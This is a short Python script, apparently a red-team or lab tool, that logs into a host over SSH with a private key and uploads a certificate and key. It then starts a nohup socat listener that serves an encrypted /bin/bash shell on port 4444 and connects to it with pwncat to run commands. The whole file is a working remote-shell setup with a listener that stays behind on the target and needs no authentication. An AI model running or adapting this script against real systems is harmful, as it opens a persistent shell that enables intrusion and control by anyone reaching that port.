import paramiko
from pwncat.manager import Manager 
import time

# === Configuration ===
target_host = "10.0.0.148"
target_port = 22
username = "sysadmin"
ssh_key_path = "/home/parallels/.ssh/id_rsa"  # Replace with your actual private key path

# Port on the target where socat will listen
remote_port = 4444

# SSL certificate and key paths (must exist on target)
remote_cert = "/tmp/target-cert.pem"
remote_key = "/tmp/target-key.pem"

# === Step 1: Connect to target via SSH using key ===
ssh_key = paramiko.RSAKey.from_private_key_file(ssh_key_path)
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(target_host, port=target_port, username=username, pkey=ssh_key)

# === Step 2: Deploy SSL cert and key to target ===
with open("cert.pem", "r") as cert_file:
    cert_data = cert_file.read()
with open("key.pem", "r") as key_file:
    key_data = key_file.read()

sftp = ssh.open_sftp()
with sftp.file(remote_cert, "w") as f:
    f.write(cert_data)
with sftp.file(remote_key, "w") as f:
    f.write(key_data)
sftp.chmod(remote_cert, 0o600)
sftp.chmod(remote_key, 0o600)
sftp.close()

# === Step 3: Start socat listener on target ===
socat_cmd = (
    f"nohup socat OPENSSL-LISTEN:{remote_port},cert={remote_cert},key={remote_key},reuseaddr "
    f"EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &"
)
ssh.exec_command(socat_cmd)
print("[*] socat listener started on target")

# === Step 4: Wait briefly for socat to initialize ===
time.sleep(2)

# === Step 5: Connect to the remote encrypted shell using pwncat ===
manager = Manager()
session = manager.connect(f"ssl://{target_host}:{remote_port}")
print(f"[+] Connected to encrypted shell on {target_host}:{remote_port}")

# === Step 6: Run commands ===
print("[*] Running whoami...")
print(session.run("whoami"))

print("[*] Running uname -a...")
print(session.run("uname -a"))

# === Step 7: Close session and SSH ===
session.close()
ssh.close()
print("[*] Session closed.")
